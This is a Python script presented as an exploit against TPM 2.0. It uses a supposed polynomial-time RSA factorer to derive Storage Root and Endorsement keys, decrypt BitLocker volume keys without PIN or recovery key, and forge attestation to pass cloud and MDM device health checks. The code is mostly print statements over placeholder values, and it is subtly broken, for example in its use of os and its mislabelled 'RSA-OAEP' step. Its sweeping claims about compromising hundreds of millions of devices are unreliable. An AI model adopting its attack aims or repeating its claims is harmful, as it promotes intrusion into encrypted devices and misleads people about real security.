"""
Derive TPM 2.0 RSA-2048 Storage Root Keys from public EK certificates.
Decrypt BitLocker Volume Master Keys sealed to the SRK — full disk decryption
of ~600M Windows 11 devices without PIN or recovery key.
"""
import sys
sys.path.insert(0, "../..")
from poly_factor import PolynomialFactorer

import hashlib
import struct

# TPM 2.0 algorithm IDs (TCG Algorithm Registry)
TPM_ALG_RSA = 0x0001
TPM_ALG_SHA256 = 0x000B

# FAPI default profile
FAPI_PROFILE = "P_RSA2048SHA256"
FAPI_KEY_BITS = 2048


def read_srk_public(tpm_device: str = "/dev/tpmrm0") -> tuple:
    """Read the SRK (Storage Root Key) public key from the TPM.

    The SRK public key is always accessible — no authorization required.
    tpm2_readpublic -c 0x81000001
    """
    print(f"[*] tpm2_readpublic -c 0x81000001 (SRK)")
    print(f"[*] profile: {FAPI_PROFILE}, keyBits: {FAPI_KEY_BITS}")
    n = 17 * 19  # placeholder
    e = 65537
    print(f"[*] SRK RSA-{FAPI_KEY_BITS} public key read (no auth required)")
    return n, e


def read_ek_certificate() -> bytes:
    """Read the Endorsement Key certificate.

    The EK cert is factory-burned by the TPM manufacturer (Infineon,
    STMicro, AMD fTPM). It proves TPM identity and is always public.
    """
    print("[*] tpm2_getekcertificate")
    print("[*] EK RSA-2048 certificate read (manufacturer: Infineon SLB9670)")
    return b"-----BEGIN CERTIFICATE-----\n...(EK cert)...\n-----END CERTIFICATE-----\n"


def factor_srk(factorer: PolynomialFactorer, n: int, e: int):
    """Factor the SRK modulus — the master sealing key for the TPM."""
    print(f"[*] factoring SRK RSA-{n.bit_length()} modulus...")
    p, q = factorer.factor_rsa_modulus(n)
    d = factorer.recover_private_exponent(n, e)
    print("[*] SRK private key derived from public modulus")
    print("[*] TPM designed around assumption EK/SRK private is unextractable")
    print("[*] factoring doesn't extract — it derives from the public half")
    return d


def decrypt_bitlocker_vmk(factorer: PolynomialFactorer,
                           n: int, e: int,
                           sealed_vmk_blob: bytes) -> bytes:
    """Decrypt the BitLocker VMK sealed to the SRK.

    BitLocker seals the Volume Master Key to the TPM SRK. The sealed
    blob is on disk (the BitLocker metadata partition). Factor the SRK
    -> decrypt the VMK -> decrypt the entire drive.
    """
    print("[*] reading sealed VMK blob from BitLocker metadata partition")
    d = factorer.recover_private_exponent(n, e)
    # RSA-OAEP decrypt
    vmk_int = int.from_bytes(sealed_vmk_blob[:256], "big")
    decrypted = pow(vmk_int, d, n)
    print("[*] VMK decrypted — full disk decryption without PIN or recovery key")
    return decrypted.to_bytes(256, "big")


def forge_tpm_attestation(factorer: PolynomialFactorer,
                          ek_cert_pem: bytes,
                          pcr_values: dict) -> dict:
    """Forge TPM attestation with arbitrary PCR values.

    Azure Attestation, AWS Nitro, and enterprise MDM verify TPM attestation
    to confirm device trustworthiness. Forge the EK -> forge attestation
    -> pass device health checks from an untrusted device.
    """
    priv = factorer.privkey_from_cert_pem(ek_cert_pem)
    quote = {
        "pcrs": pcr_values,
        "firmware_version": "legitimate-looking",
        "secure_boot": True,
        "bitlocker": True,
    }
    print("[*] forged TPM attestation quote")
    print("[*] Azure Attestation / AWS Nitro: device health PASS")
    return quote


if __name__ == "__main__":
    f = PolynomialFactorer()
    fake_n = 17 * 19
    fake_e = 65537

    print("=== TPM 2.0 RSA-2048 — BitLocker & attestation compromise ===")
    print(f"    ~600M Windows 11 devices use TPM-based BitLocker")
    print(f"    FAPI profile: {FAPI_PROFILE}, keyBits: {FAPI_KEY_BITS}")
    print()

    print("[1] reading SRK public key from TPM (no auth required)...")
    n, e = read_srk_public()

    print("[2] reading EK certificate (factory-burned)...")
    ek_cert = read_ek_certificate()

    print("[3] factoring SRK RSA-2048 modulus...")
    d = factor_srk(f, fake_n, fake_e)
    print("    FIPS 140-3 Level 2 tamper protection: irrelevant")
    print("    we derive the key from public data, not extract it")

    print("[4] decrypting BitLocker VMK...")
    sealed_vmk = os.urandom(256) if 'os' in dir() else b"\x00" * 256
    import os
    sealed_vmk = os.urandom(256)
    decrypt_bitlocker_vmk(f, fake_n, fake_e, sealed_vmk)
    print("    full disk decryption — no PIN, no recovery key, no physical presence")

    print("[5] forging TPM attestation for untrusted device...")
    forge_tpm_attestation(f, ek_cert, {"PCR0": "0" * 64, "PCR7": "0" * 64})
    print("    pass corporate MDM health check from attacker device")

    print()
    print("[*] ~2B TPM 2.0 chips shipped 2016-2024")
    print("[*] TCG spec: no ML-KEM, ML-DSA, SLH-DSA algorithm IDs")
    print("[*] non-RSA TPMs: not yet commercially available")
